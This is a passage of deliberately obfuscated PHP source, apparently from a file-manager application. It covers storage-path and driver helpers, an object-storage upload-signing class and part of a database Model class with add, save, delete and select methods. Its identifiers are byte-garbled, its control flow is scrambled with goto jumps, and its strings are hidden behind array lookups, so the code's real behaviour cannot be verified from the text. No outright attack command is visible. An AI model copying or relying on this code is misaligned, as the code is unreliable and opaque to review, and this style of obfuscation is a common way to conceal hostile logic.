self::make(Model($Eˆò°ßÂØá[770])->systemRootPathAdd($Eˆò°ßÂØá[500])); } else { $Eƒ…Õ…øàÕ = self::systemPath($Eˆò°ßÂØá[1148]); $f¡èÅÂãë = self::sourceID($Eƒ…Õ…øàÕ); $Eƒ…Õ…øàÕ = self::make(Model($Eˆò°ßÂØá[770])->mkdir($f¡èÅÂãë, $b›’ÂÍ ÁÖ)); } Model($Eˆò°ßÂØá[1102])->set($d¹ÒöğÎÆ, $Eƒ…Õ…øàÕ); goto CèöõĞÔïÜ; b·¯áÅÚŒŒ: } public static function systemFolder($c¿ÇŒ÷ëÁ›) { $B ¿Ú‘Ø¹‚ = IO_PATH_SYSTEM_SOURCE . $c¿ÇŒ÷ëÁ›; $cÈÊ¯èÜÃ¥ = Cache::get($B ¿Ú‘Ø¹‚); if (!$cÈÊ¯èÜÃ¥) { $Bù‹”ù×í£ = IO::infoFull($B ¿Ú‘Ø¹‚); if (!$Bù‹”ù×í£) { $cÈÊ¯èÜÃ¥ = IO::mkdir($B ¿Ú‘Ø¹‚, REPEAT_SKIP); } else { $cÈÊ¯èÜÃ¥ = $Bù‹”ù×í£[$_SERVER[¹…ÕÄ][75]]; } Cache::set($B ¿Ú‘Ø¹‚, $cÈÊ¯èÜÃ¥, 3600 * 10); } return $cÈÊ¯èÜÃ¥; } public static function defaultDriver() { return Model($_SERVER[¹…ÕÄ][719])->defaultDriver(); } public static function defaultIO() { $Eà…Òà¼íŠ =& $_SERVER[¹…ÕÄ]; $E«ÄĞ±•¹Ö = self::defaultDriver(); return $Eà…Òà¼íŠ[1156] . $E«ÄĞ±•¹Ö[$Eà…Òà¼íŠ[388]] . $Eà…Òà¼íŠ[1145]; } public static function defaultDriverInit() { static $BŸË‚£ÎÆñ = false; if ($BŸË‚£ÎÆñ) { return $BŸË‚£ÎÆñ; } $BŸË‚£ÎÆñ = IO::init(self::defaultIO()); return $BŸË‚£ÎÆñ; } public static function fileTypeList() { $C÷”¨ÕÑò‰ =& $_SERVER[¹…ÕÄ]; $aÁ–Ñ”Şƒâ = $GLOBALS[$C÷”¨ÕÑò‰[6]][$C÷”¨ÕÑò‰[1157]]; foreach ($aÁ–Ñ”Şƒâ as $cŠ‡êÑÎ¢â => $c¤ŒèæÂ¹) { $BÎÓåÃï±ç = $C÷”¨ÕÑò‰[1158] . $cŠ‡êÑÎ¢â; $c»ÛšŠğ = LNG($BÎÓåÃï±ç); if ($BÎÓåÃï±ç != $c»ÛšŠğ) { $aÁ–Ñ”Şƒâ[$cŠ‡êÑÎ¢â][$C÷”¨ÕÑò‰[28]] = $c»ÛšŠğ; } } return $aÁ–Ñ”Şƒâ; } public static function transferType($dášùš¤©¿, $C‡–á¶ÌÇ„) { goto E«¶õÙØäã; eÍĞëôá¨©: if ($b„Áá‰‘¤“[$bç°“‰ó›[29]] == $cĞ‘ñ«Çõ‰[$bç°“‰ó›[29]] && $b„Áá‰‘¤“[$bç°“‰ó›[1159]] == $cĞ‘ñ«Çõ‰[$bç°“‰ó›[1159]]) { return $bç°“‰ó›[1160]; } if ($b„Áá‰‘¤“[$bç°“‰ó›[29]] == $bç°“‰ó›[803] && $cĞ‘ñ«Çõ‰[$bç°“‰ó›[29]] == $bç°“‰ó›[105]) { return $bç°“‰ó›[1072]; } if ($b„Áá‰‘¤“[$bç°“‰ó›[29]] == $bç°“‰ó›[105] && $cĞ‘ñ«Çõ‰[$bç°“‰ó›[29]] == $bç°“‰ó›[803]) { return $bç°“‰ó›[106]; } goto eœ—î¸®“; eœ—î¸®“: return $bç°“‰ó›[1161]; goto e—Óˆ²ö›‡; E«¶õÙØäã: $bç°“‰ó› =& $_SERVER[¹…ÕÄ]; $b„Áá‰‘¤“ = self::driverType($dášùš¤©¿); $cĞ‘ñ«Çõ‰ = self::driverType($C‡–á¶ÌÇ„); goto eÍĞëôá¨©; e—Óˆ²ö›‡: } public static function driverType($c¦¶‚è„ƒõ) { goto Fİ’«‡ƒ½Â; FªõÅÒ‚¬„: if ($D‘ØŸËÒ‡ == $Bö‚ÏèŒÇÁ[710] || $D‘ØŸËÒ‡ == $Bö‚ÏèŒÇÁ[1163] || $D‘ØŸËÒ‡ == $Bö‚ÏèŒÇÁ[1164]) { $c¦¶‚è„ƒõ = self::defaultDriverInit(); } else { if ($D‘ØŸËÒ‡ == $Bö‚ÏèŒÇÁ[1079] || $D‘ØŸËÒ‡ == $Bö‚ÏèŒÇÁ[1165]) { $c¦¶‚è„ƒõ = IO::init($c¦¶‚è„ƒõ->pathParse[$Bö‚ÏèŒÇÁ[1026]]); } } $D‘ØŸËÒ‡ = str_replace($Bö‚ÏèŒÇÁ[1162], $Bö‚ÏèŒÇÁ[33], strtolower($c¦¶‚è„ƒõ->getType())); if ($D‘ØŸËÒ‡ == $Bö‚ÏèŒÇÁ[105]) { return array($Bö‚ÏèŒÇÁ[29] => $Bö‚ÏèŒÇÁ[105], $Bö‚ÏèŒÇÁ[1159] => $Bö‚ÏèŒÇÁ[33], $Bö‚ÏèŒÇÁ[75] => $cãâï÷Ï¢å); } goto DÄÕƒÍñù; Fİ’«‡ƒ½Â: $Bö‚ÏèŒÇÁ =& $_SERVER[¹…ÕÄ]; $cãâï÷Ï¢å = $c¦¶‚è„ƒõ->path; $D‘ØŸËÒ‡ = str_replace($Bö‚ÏèŒÇÁ[1162], $Bö‚ÏèŒÇÁ[33], strtolower($c¦¶‚è„ƒõ->getType())); goto FªõÅÒ‚¬„; DÄÕƒÍñù: return array($Bö‚ÏèŒÇÁ[29] => $Bö‚ÏèŒÇÁ[803], $Bö‚ÏèŒÇÁ[1159] => $c¦¶‚è„ƒõ->pathDriver, $Bö‚ÏèŒÇÁ[75] => $cãâï÷Ï¢å); goto dÕí—Ÿ»ŒÄ; dÕí—Ÿ»ŒÄ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($C«¸Ê‘ Æ†) { parent::__construct($C«¸Ê‘ Æ†); $this->signatureVersion($_SERVER[¹…ÕÄ][210]); } public function uploadFormData($a½—é“î´Í, $CâÏ¦”×æ· = 3600) { goto EğŒÕÖáäÁ; EğŒÕÖáäÁ: $c¢õ¤ÁÕÂ‘ =& $_SERVER[¹…ÕÄ]; $EƒËŸŞˆ† = $c¢õ¤ÁÕÂ‘[191]; $c×ŸØ”ã±ã = $c¢õ¤ÁÕÂ‘[228]; goto a…Çô§Ã‹Å; aÚ§Š…®Œ: return $DÔ¿ĞØõÑ¯; goto D›ÃšäÒà; AÈğ¯ïğØì: $Dç¦…¸²µ = array($c¢õ¤ÁÕÂ‘[1168] => $AÂê·äÕù, $c¢õ¤ÁÕÂ‘[1169] => array(array($c¢õ¤ÁÕÂ‘[1170] => $EƒËŸŞˆ†), array($c¢õ¤ÁÕÂ‘[1171] => $this->bucket), array($c¢õ¤ÁÕÂ‘[1172], $c¢õ¤ÁÕÂ‘[1173], $c¢õ¤ÁÕÂ‘[33]), array($c¢õ¤ÁÕÂ‘[1174] => $eÎñ›¨ô), array($c¢õ¤ÁÕÂ‘[1175] => $c×ŸØ”ã±ã), array($c¢õ¤ÁÕÂ‘[1176] => $this->accessKey), array($c¢õ¤ÁÕÂ‘[1177] => $B¹‰Òİ©¡))); $Dç¦…¸²µ = json_encode($Dç¦…¸²µ); $d‰—êÁ¯ÎÊ = hash_hmac($c¢õ¤ÁÕÂ‘[228], $B¹‰Òİ©¡, $this->secret); goto BŠˆëˆ½ ·; a…Çô§Ã‹Å: $eÎñ›¨ô = $c¢õ¤ÁÕÂ‘[1166]; $AÂê·äÕù = gmdate($c¢õ¤ÁÕÂ‘[1167], time() + $CâÏ¦”×æ·); $B¹‰Òİ©¡ = (string) time() . $c¢õ¤ÁÕÂ‘[67] . (string) (time() + $CâÏ¦”×æ·); goto AÈğ¯ïğØì; BŠˆëˆ½ ·: $Fä§®ÔÉ”ë = sha1($Dç¦…¸²µ); $DßÊÊÄâ = hash_hmac($c¢õ¤ÁÕÂ‘[228], $Fä§®ÔÉ”ë, $d‰—êÁ¯ÎÊ); $DÔ¿ĞØõÑ¯ = array($c¢õ¤ÁÕÂ‘[1170] => $EƒËŸŞˆ†, $c¢õ¤ÁÕÂ‘[1174] => $eÎñ›¨ô, $c¢õ¤ÁÕÂ‘[1178] => base64_encode($Dç¦…¸²µ), $c¢õ¤ÁÕÂ‘[1175] => $c×ŸØ”ã±ã, $c¢õ¤ÁÕÂ‘[1176] => $this->accessKey, $c¢õ¤ÁÕÂ‘[1179] => $B¹‰Òİ©¡, $c¢õ¤ÁÕÂ‘[1180] => $DßÊÊÄâ, $c¢õ¤ÁÕÂ‘[175] => $this->getHost()); goto aÚ§Š…®Œ; D›ÃšäÒà: } public function fileOutLink($fä…°Š ´¬) { $eµÇ‡İï =& $_SERVER[¹…ÕÄ]; if (substr($fä…°Š ´¬, 0, 7) == $eµÇ‡İï[1181]) { $fä…°Š ´¬ = $eµÇ‡İï[1182] . substr($fä…°Š ´¬, 7); } header($eµÇ‡İï[158] . $fä…°Š ´¬); die; } } goto eµ´„ï»ŠË; DåŒÉï‡…Ê: define($_SERVER[¹…ÕÄ][238], 0); define($_SERVER[¹…ÕÄ][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\145", "\x6f\x72\144\x65\162", "\x61\154\151\141\163", "\x68\x61\166\151\x6e\147", "\147\162\157\165\x70", "\x6c\x6f\x63\153", "\x64\x69\x73\x74\151\156\x63\164", "\x61\x75\x74\157", "\x66\x69\154\164\x65\162", "\x76\141\154\151\144\x61\x74\145", "\x72\145\163\165\154\x74", "\142\x69\156\x64", "\164\157\153\145\x6e"); public function __construct($cÄ—æØÁ« = '', $A°Ô£¤²†è = '', $dß‡Ú³‡ã = '') { $Aœ†‘·‚ÚŸ =& $_SERVER[¹…ÕÄ]; $this->_initialize(); if (!empty($cÄ—æØÁ«)) { if (strpos($cÄ—æØÁ«, $Aœ†‘·‚ÚŸ[94])) { list($this->dbName, $this->name) = explode($Aœ†‘·‚ÚŸ[94], $cÄ—æØÁ«); } else { $this->name = $cÄ—æØÁ«; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($A°Ô£¤²†è)) { $this->tablePrefix = $Aœ†‘·‚ÚŸ[33]; } elseif ($Aœ†‘·‚ÚŸ[33] != $A°Ô£¤²†è) { $this->tablePrefix = $A°Ô£¤²†è; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Aœ†‘·‚ÚŸ[240]); } $this->db(0, empty($this->connection) ? $dß‡Ú³‡ã : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bƒ•„ËŸ =& $_SERVER[¹…ÕÄ]; if (empty($this->fields)) { if (think_config($bƒ•„ËŸ[241])) { $e”¬éÄÜƒ› = $this->dbName ? $this->dbName : think_config($bƒ•„ËŸ[242]); $e¾¡¾ ‡É = think_var_cache($bƒ•„ËŸ[243] . strtolower(get_path_this($e”¬éÄÜƒ›) . $bƒ•„ËŸ[94] . $this->name)); if ($e¾¡¾ ‡É) { $B‡‰ŸÕŞƒß = think_config($bƒ•„ËŸ[244]); if (empty($B‡‰ŸÕŞƒß) || $e¾¡¾ ‡É[$bƒ•„ËŸ[245]] == $B‡‰ŸÕŞƒß) { $this->fields = $e¾¡¾ ‡É; return; } } } $this->flush(); } } public function flush() { goto d²Á ÍŒ•; cŠÉ¸æ±Àƒ: if (!$AÅ º‘ÏÔ) { return !1; } $this->fields = array_keys($AÅ º‘ÏÔ); $this->fields[$eË³ˆñ„ƒ[246]] = !1; goto FàØÇá›¿Š; d²Á ÍŒ•: $eË³ˆñ„ƒ =& $_SERVER[¹…ÕÄ]; $this->db->setModel($this->name); $AÅ º‘ÏÔ = $this->db->getFields($this->getTableName()); goto cŠÉ¸æ±Àƒ; DÀäŒÏŠ: if (think_config($eË³ˆñ„ƒ[241])) { $D¿æÇ‹¶î = $this->dbName ? $this->dbName : think_config($eË³ˆñ„ƒ[242]); think_var_cache($eË³ˆñ„ƒ[243] . strtolower(get_path_this($D¿æÇ‹¶î) . $eË³ˆñ„ƒ[94] . $this->name), $this->fields); } goto bæß®Î×ô; FàØÇá›¿Š: foreach ($AÅ º‘ÏÔ as $b²¤°‡Èä => $F±§ËñŠ´š) { $fĞ‹”é¿È¸[$b²¤°‡Èä] = $F±§ËñŠ´š[$eË³ˆñ„ƒ[29]]; if ($F±§ËñŠ´š[$eË³ˆñ„ƒ[36]]) { $this->fields[$eË³ˆñ„ƒ[247]] = $b²¤°‡Èä; if ($F±§ËñŠ´š[$eË³ˆñ„ƒ[39]]) { $this->fields[$eË³ˆñ„ƒ[246]] = !0; } } } $this->fields[$eË³ˆñ„ƒ[248]] = $fĞ‹”é¿È¸; if (think_config($eË³ˆñ„ƒ[244])) { $this->fields[$eË³ˆñ„ƒ[245]] = think_config($eË³ˆñ„ƒ[244]); } goto DÀäŒÏŠ; bæß®Î×ô: } public function switchModel($b¦ì¤ÎóÙÔ, $D»„·±›À¼ = array()) { $EŒ»ÛÅèäß =& $_SERVER[¹…ÕÄ]; $aƒ³ î¸¶· = ucwords(strtolower($b¦ì¤ÎóÙÔ)) . $EŒ»ÛÅèäß[249]; if (!class_exists($aƒ³ î¸¶·)) { think_exception($aƒ³ î¸¶· . think_lang($EŒ»ÛÅèäß[250])); } $this->_extModel = new $aƒ³ î¸¶·($this->name); if (!empty($D»„·±›À¼)) { foreach ($D»„·±›À¼ as $Fïí×”¥±È) { $this->_extModel->setProperty($Fïí×”¥±È, $this->{$Fïí×”¥±È}); } } return $this->_extModel; } public function __set($Eá†º¾Àà¾, $b‘¦Úİâíñ) { $this->data[$Eá†º¾Àà¾] = $b‘¦Úİâíñ; } public function __get($FÆÊÊ›® £) { return isset($this->data[$FÆÊÊ›® £]) ? $this->data[$FÆÊÊ›® £] : null; } public function __isset($C¹Ò¦±â—é) { return isset($this->data[$C¹Ò¦±â—é]); } public function __unset($A¤İ¤Ò¨Úİ) { unset($this->data[$A¤İ¤Ò¨Úİ]); } public function __call($CÎ£å²ªğ, $bõ©ÌŸ±­) { $aÕÀË·¾‡ =& $_SERVER[¹…ÕÄ]; if (in_array(strtolower($CÎ£å²ªğ), $this->methods, !0)) { $this->options[strtolower($CÎ£å²ªğ)] = $bõ©ÌŸ±­[0]; return $this; } elseif (in_array(strtolower($CÎ£å²ªğ), array($aÕÀË·¾‡[251], $aÕÀË·¾‡[252], $aÕÀË·¾‡[253], $aÕÀË·¾‡[254], $aÕÀË·¾‡[255]), !0)) { $B¥ÌÚ£§âŠ = isset($bõ©ÌŸ±­[0]) ? $bõ©ÌŸ±­[0] : $aÕÀË·¾‡[182]; $B¥ÌÚ£§âŠ = $this->db->parseKey($B¥ÌÚ£§âŠ); return $this->getField(strtoupper($CÎ£å²ªğ) . $aÕÀË·¾‡[256] . $B¥ÌÚ£§âŠ . $aÕÀË·¾‡[257] . $CÎ£å²ªğ, $aÕÀË·¾‡[251]); } elseif (strtolower(substr($CÎ£å²ªğ, 0, 5)) == $aÕÀË·¾‡[258]) { $B¥ÌÚ£§âŠ = think_parse_name(substr($CÎ£å²ªğ, 5)); $fŸ©œ¨ßĞâ[$B¥ÌÚ£§âŠ] = $bõ©ÌŸ±­[0]; return $this->where($fŸ©œ¨ßĞâ)->find(); } elseif (strtolower(substr($CÎ£å²ªğ, 0, 10)) == $aÕÀË·¾‡[259]) { $DùÆÀå†îÖ = think_parse_name(substr($CÎ£å²ªğ, 10)); $fŸ©œ¨ßĞâ[$DùÆÀå†îÖ] = $bõ©ÌŸ±­[0]; return $this->where($fŸ©œ¨ßĞâ)->getField($bõ©ÌŸ±­[1]); } elseif (isset($this->_scope[$CÎ£å²ªğ])) { return $this->scope($CÎ£å²ªğ, $bõ©ÌŸ±­[0]); } elseif (method_exists($this, $CÎ£å²ªğ)) { array_unshift($bõ©ÌŸ±­, $CÎ£å²ªğ); return call_user_func_array(array($this, $aÕÀË·¾‡[260]), $bõ©ÌŸ±­); } else { return call_user_func_array(array(parent, $CÎ£å²ªğ), $bõ©ÌŸ±­); } } protected function call() { goto d—ÍØŒ˜; f…¹Ğßìù³: $E‚¥ˆà°¯ = $D°»«ñğŞâ; if (is_array($D°»«ñğŞâ)) { $E‚¥ˆà°¯ = $D°»«ñğŞâ[1]; $D°»«ñğŞâ = $D°»«ñğŞâ[0]; } $FÛ­İØ°»Ø = count($BïÓÏŒã¨ã) - 1; goto Aƒ…Ì™Ú·Ò; d—ÍØŒ˜: $DğÉ¹çõâ£ =& $_SERVER[¹…ÕÄ]; $BïÓÏŒã¨ã = func_get_args(); $D°»«ñğŞâ = array_shift($BïÓÏŒã¨ã); goto f…¹Ğßìù³; D„àá‡«: $bŠ¦õŞñäÛ = call_user_func_array(array($this, $D°»«ñğŞâ), $BïÓÏŒã¨ã); if (method_exists($this, $DğÉ¹çõâ£[264])) { $AÛÈÊ‡¢¥‡ = call_user_func_array(array($this, $DğÉ¹çõâ£[265]), array($E‚¥ˆà°¯, $BïÓÏŒã¨ã, $bŠ¦õŞñäÛ)); if ($AÛÈÊ‡¢¥‡) { return $AÛÈÊ‡¢¥‡; } } return $bŠ¦õŞñäÛ; goto AÓõìë¯Ï; Aƒ…Ì™Ú·Ò: if (isset($BïÓÏŒã¨ã[$FÛ­İØ°»Ø]) && $BïÓÏŒã¨ã[$FÛ­İØ°»Ø] === $D°»«ñğŞâ) { think_exception(__CLASS__ . $DğÉ¹çõâ£[4] . $D°»«ñğŞâ . think_lang($DğÉ¹çõâ£[261])); return; } $BïÓÏŒã¨ã[] = $D°»«ñğŞâ; if (method_exists($this, $DğÉ¹çõâ£[262])) { $AÛÈÊ‡¢¥‡ = call_user_func_array(array($this, $DğÉ¹çõâ£[263]), array($E‚¥ˆà°¯, $BïÓÏŒã¨ã)); if (!is_null($AÛÈÊ‡¢¥‡) && $AÛÈÊ‡¢¥‡ !== !1) { return $AÛÈÊ‡¢¥‡; } } goto D„àá‡«; AÓõìë¯Ï: } protected function _initialize() { } protected function _facade($cŸ×®ºÊÆ) { $E¬Â¤›²é¹ =& $_SERVER[¹…ÕÄ]; if (!empty($this->fields)) { foreach ($cŸ×®ºÊÆ as $F««ÍªŠ±« => $c’ñ¡¥°©) { if (is_array($this->fields) && !in_array($F««ÍªŠ±«, $this->fields, !0)) { unset($cŸ×®ºÊÆ[$F««ÍªŠ±«]); } elseif (is_scalar($c’ñ¡¥°©)) { $this->_parseType($cŸ×®ºÊÆ, $F««ÍªŠ±«); } } } if (!empty($this->options[$E¬Â¤›²é¹[266]])) { $cŸ×®ºÊÆ = array_map($this->options[$E¬Â¤›²é¹[266]], $cŸ×®ºÊÆ); unset($this->options[$E¬Â¤›²é¹[266]]); } $this->_beforeWrite($cŸ×®ºÊÆ); return $cŸ×®ºÊÆ; } protected function _beforeWrite(&$fšµ»ËÏ²) { } public function add($dõ‡Şè÷–Ã = '', $b´ğœ®…À„ = array(), $B’•Œè Ùô = false) { goto A‹³„ÀµÑ; fˆÌä©à¢­: if (!1 === $this->_beforeInsert($dõ‡Şè÷–Ã, $b´ğœ®…À„)) { return !1; } $dó† ‡İæ„ = $this->db->insert($dõ‡Şè÷–Ã, $b´ğœ®…À„, $B’•Œè Ùô); if (!1 !== $dó† ‡İæ„) { $B±¸‘ùÑö‘ = $this->getLastInsID(); if ($B±¸‘ùÑö‘) { $dõ‡Şè÷–Ã[$this->getPk()] = $B±¸‘ùÑö‘; $this->_after_insert($dõ‡Şè÷–Ã, $b´ğœ®…À„); return $B±¸‘ùÑö‘; } $this->_after_insert($dõ‡Şè÷–Ã, $b´ğœ®…À„); } goto a¶¶Öë—ùÉ; A‹³„ÀµÑ: if (empty($dõ‡Şè÷–Ã)) { if (!empty($this->data)) { $dõ‡Şè÷–Ã = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹…ÕÄ][267]); return !1; } } $b´ğœ®…À„ = $this->_parseOptions($b´ğœ®…À„); $dõ‡Şè÷–Ã = $this->_facade($dõ‡Şè÷–Ã); goto fˆÌä©à¢­; a¶¶Öë—ùÉ: return $dó† ‡İæ„; goto CÂğ‡ê®¢Å; CÂğ‡ê®¢Å: } protected function _beforeInsert(&$eø¸Œ¸¹÷, $e¤Ü‹Ëåµ—) { } protected function _after_insert($E©÷ÄÃ, $a¶°†ÄÆŠŒ) { } public function addAll($bÌ„÷Ôó, $d¬ßÃÍäŞ = array(), $D‘ÀÇ•åÀ = false) { goto F”å´Ÿ‹‚¤; BÁ¼è„ñ‰: return $e´ÆÇéùèÔ; goto eó‡‹Û˜¤¢; cÎÑ¾ã¯ë¤: foreach ($bÌ„÷Ôó as $fïÓ‹‘Ú•‰ => $eŠˆÂ»²“ˆ) { $bÌ„÷Ôó[$fïÓ‹‘Ú•‰] = $this->_facade($eŠˆÂ»²“ˆ); } if (method_exists($this->db, $f»‡£ô†‚[268])) { $e´ÆÇéùèÔ = $this->db->insertAll($bÌ„÷Ôó, $d¬ßÃÍäŞ, $D‘ÀÇ•åÀ); } else { $this->startTrans(); foreach ($bÌ„÷Ôó as $fïÓ‹‘Ú•‰ => $eŠˆÂ»²“ˆ) { $e´ÆÇéùèÔ = $this->db->insert($eŠˆÂ»²“ˆ, $d¬ßÃÍäŞ, $D‘ÀÇ•åÀ); } $this->commit(); } if (!1 !== $e´ÆÇéùèÔ) { $AãéÑØÒ²½ = $this->getLastInsID(); if ($AãéÑØÒ²½) { return $AãéÑØÒ²½; } } goto BÁ¼è„ñ‰; F”å´Ÿ‹‚¤: $f»‡£ô†‚ =& $_SERVER[¹…ÕÄ]; if (empty($bÌ„÷Ôó)) { $this->error = think_lang($f»‡£ô†‚[267]); return !1; } $d¬ßÃÍäŞ = $this->_parseOptions($d¬ßÃÍäŞ); goto cÎÑ¾ã¯ë¤; eó‡‹Û˜¤¢: } public function selectAdd($cª¯Œ¶éÂ = '', $F´õ‚ö…äë = '', $Bçè»»‚†î = array()) { $B©éÉæ–®ê =& $_SERVER[¹…ÕÄ]; $Bçè»»‚†î = $this->_parseOptions($Bçè»»‚†î); if (!1 === ($E´Á¡«¬è = $this->db->selectInsert($cª¯Œ¶éÂ ? $cª¯Œ¶éÂ : $Bçè»»‚†î[$B©éÉæ–®ê[269]], $F´õ‚ö…äë ? $F´õ‚ö…äë : $this->getTableName(), $Bçè»»‚†î))) { $this->error = think_lang($B©éÉæ–®ê[270]); return !1; } else { return $E´Á¡«¬è; } } public function save($B°Áí¯ÆÇñ = '', $DÙ£ä£•ì = array()) { goto bØÄŸÉëÏ; Dâ™ñÍªíˆ: if (is_array($DÙ£ä£•ì[$bÇÉ¼±Ø÷‰[271]]) && isset($DÙ£ä£•ì[$bÇÉ¼±Ø÷‰[271]][$cÂ›ø†„äİ])) { $eíÖÛÔ£í = $DÙ£ä£•ì[$bÇÉ¼±Ø÷‰[271]][$cÂ›ø†„äİ]; } if (!1 === $this->_beforeUpdate($B°Áí¯ÆÇñ, $DÙ£ä£•ì)) { return !1; } $F¥è²é•À = $this->db->update($B°Áí¯ÆÇñ, $DÙ£ä£•ì); goto f®ßĞ—™¾“; B«ÀÙ÷Û¨: $DÙ£ä£•ì = $this->_parseOptions($DÙ£ä£•ì); $cÂ›ø†„äİ = $this->getPk(); if (!isset($DÙ£ä£•ì[$bÇÉ¼±Ø÷‰[271]])) { if (isset($B°Áí¯ÆÇñ[$cÂ›ø†„äİ])) { $bï ¢¶É[$cÂ›ø†„äİ] = $B°Áí¯ÆÇñ[$cÂ›ø†„äİ]; $DÙ£ä£•ì[$bÇÉ¼±Ø÷‰[271]] = $bï ¢¶É; unset($B°Áí¯ÆÇñ[$cÂ›ø†„äİ]); } else { $this->error = think_lang($bÇÉ¼±Ø÷‰[270]); return !1; } } goto Dâ™ñÍªíˆ; bØÄŸÉëÏ: $bÇÉ¼±Ø÷‰ =& $_SERVER[¹…ÕÄ]; if (empty($B°Áí¯ÆÇñ)) { if (!empty($this->data)) { $B°Áí¯ÆÇñ = $this->data; $this->data = array(); } else { $this->error = think_lang($bÇÉ¼±Ø÷‰[267]); return !1; } } $B°Áí¯ÆÇñ = $this->_facade($B°Áí¯ÆÇñ); goto B«ÀÙ÷Û¨; f®ßĞ—™¾“: if (!1 !== $F¥è²é•À) { if (isset($eíÖÛÔ£í)) { $B°Áí¯ÆÇñ[$cÂ›ø†„äİ] = $eíÖÛÔ£í; } $this->_afterUpdate($B°Áí¯ÆÇñ, $DÙ£ä£•ì); } return $F¥è²é•À; goto C¹†™š‘Ó¿; C¹†™š‘Ó¿: } protected function _beforeUpdate(&$d†¤„‚É¾•, $B¡©½…Îò) { } protected function _afterUpdate($føÏ‰”’, $AùôÔùë¬) { } public function delete($a®ÔÏÈ» = array()) { goto FŞÚ‹Ö­À£; aš²±†Šô: if (is_numeric($a®ÔÏÈ») || is_string($a®ÔÏÈ»)) { if (strpos($a®ÔÏÈ», $fò‚¡¨šø[47])) { $D„®ãğ„Ğ›[$FÈµÙë¨«] = array($fò‚¡¨šø[272], $a®ÔÏÈ»); } else { $D„®ãğ„Ğ›[$FÈµÙë¨«] = $a®ÔÏÈ»; } $this->options[$fò‚¡¨šø[271]] = $D„®ãğ„Ğ›; } $a®ÔÏÈ» = $this->_parseOptions(); if (is_array($a®ÔÏÈ»[$fò‚¡¨šø[271]]) && isset($a®ÔÏÈ»[$fò‚¡¨šø[271]][$FÈµÙë¨«])) { $Dá‹æ“Ûƒå = $a®ÔÏÈ»[$fò‚¡¨šø[271]][$FÈµÙë¨«]; } goto fäğ•½À¾Ò; fäğ•½À¾Ò: $fÏ·À¾ÉĞª = $this->db->delete($a®ÔÏÈ»); if (!1 !== $fÏ·À¾ÉĞª) { $bÚ”•áÓøŠ = array(); if (isset($Dá‹æ“Ûƒå)) { $bÚ”•áÓøŠ[$FÈµÙë¨«] = $Dá‹æ“Ûƒå; } $this->_after_delete($bÚ”•áÓøŠ, $a®ÔÏÈ»); } return $fÏ·À¾ÉĞª; goto AÇ‡Ìè×ğŒ; FŞÚ‹Ö­À£: $fò‚¡¨šø =& $_SERVER[¹…ÕÄ]; if (empty($a®ÔÏÈ») && empty($this->options[$fò‚¡¨šø[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $FÈµÙë¨« = $this->getPk(); goto aš²±†Šô; AÇ‡Ìè×ğŒ: } protected function _after_delete($Còè”îË­¢, $fÅø¬â°·ë) { } public function select($Fö¼£ô¬µ = array()) { goto EæšİØÔ¦Æ; a‡«òâƒÅ†: $this->_afterSelect($EÅÅ•ÓŠÇ, $Fö¼£ô¬µ); return $EÅÅ•ÓŠÇ; goto a¼¥ßñ®é³; bï·ø¶’°ª: $EÅÅ•ÓŠÇ = $this->db->select($Fö¼£ô¬µ); if (!1 === $EÅÅ•ÓŠÇ) { return !1; } if (empty($EÅÅ•ÓŠÇ)) { return null; } goto a‡«òâƒÅ†; EæšİØÔ¦Æ: $e¿‘âÇŞ³Ç =& $_SERVER[¹…ÕÄ]; if (is_string($Fö¼£ô¬µ) || is_numeric($Fö¼£ô¬µ)) { $f‚ØÌ«İÙ = $this->getPk(); if (strpos($Fö¼£ô¬µ, $e¿‘âÇŞ³Ç[47])) { $EÊ²Ô§Ğá[$f‚ØÌ«İÙ] = array($e¿‘âÇŞ³Ç[272], $Fö¼£ô¬µ); } else { $EÊ²Ô§Ğá[$f‚ØÌ«İÙ] = $Fö¼£ô¬µ; } $this->options[$e¿‘âÇŞ³Ç[271]] = $EÊ²Ô§Ğá; } elseif (!1 === $Fö¼£ô¬µ) { $Fö¼£ô¬µ = $this->_parseOptions(); return $e¿‘âÇŞ³Ç[273] . $this->db->buildSelectSql($Fö¼£ô¬µ) . $e¿‘âÇŞ³Ç[274]; } $Fö¼£ô¬µ = $this->_parseOptions(); goto bï·ø¶’°ª; a¼¥ßñ®é³: } protected function _afterSelect(&$A°™¡ƒ‡“±, $E‚¦®¢ÖÍå) { } public function buildSql($Bøãã°ñçô = array()) { $F“Æ£ÉíÁÄ =& $_SERVER[¹…ÕÄ]; $Bøãã°ñçô = $this->_parseOptions($Bøãã°ñçô); return $F“Æ£ÉíÁÄ[273] . $this->db->buildSelectSql($Bøãã°ñçô) . $F“Æ£ÉíÁÄ[274]; } public function optionsValue($e¯ˆÆ¿Ç = null) { if (is_null($e¯ˆÆ¿Ç)) { return $this->options; } elseif (is_array($e¯ˆÆ¿Ç)) { $this->options = array_merge($this->options, $e¯ˆÆ¿Ç); } } protected function _parseOptions($fÆ¬äÜ©™° = array()) { goto D®àÂÓ”¿’; D±È§ò•«Ä: if (isset($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[271]]) && is_array($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[271]]) && !empty($C¬Ø»ïæÎ) && !isset($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[278]]) && !isset($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[275]])) { foreach ($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[271]] as $bŠòÁ´‰Æ¤ => $A‰ÙçÂõÄ) { $bŠòÁ´‰Æ¤ = trim($bŠòÁ´‰Æ¤); if (in_array($bŠòÁ´‰Æ¤, $C¬Ø»ïæÎ, !0)) { if (is_scalar($A‰ÙçÂõÄ)) { 